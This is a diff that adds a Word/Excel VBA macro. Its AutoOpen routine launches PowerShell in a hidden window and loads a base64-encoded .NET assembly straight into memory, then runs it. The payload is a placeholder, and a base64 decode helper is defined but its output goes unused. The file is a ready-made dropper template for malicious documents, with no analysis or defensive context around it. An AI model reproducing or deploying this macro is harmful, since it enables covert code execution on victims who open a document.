@@ -1,0 +1,26 @@
+Sub AutoOpen()
+    Dim base64Payload As String
+    Dim decoded() As Byte
+    Dim obj As Object
+
+    base64Payload = "<BASE64 ENCODED .NET DLL>"
+
+    ' Decode
+    decoded = Base64Decode(base64Payload)
+
+    ' Load .NET Assembly from memory
+    Set obj = CreateObject("Shell.Application")
+    obj.ShellExecute "powershell.exe", "-NoP -W Hidden -Command ""[System.Reflection.Assembly]::Load([Convert]::FromBase64String('" & base64Payload & "')).EntryPoint.Invoke($null, $null)""", "", "", 0
+End Sub
+
+Function Base64Decode(ByVal strData As String) As Byte()
+    Dim objXML As Object
+    Dim objNode As Object
+
+    Set objXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set objNode = objXML.createElement("b64")
+    objNode.DataType = "bin.base64"
+    objNode.Text = strData
+    Base64Decode = objNode.nodeTypedValue
+End Function
+
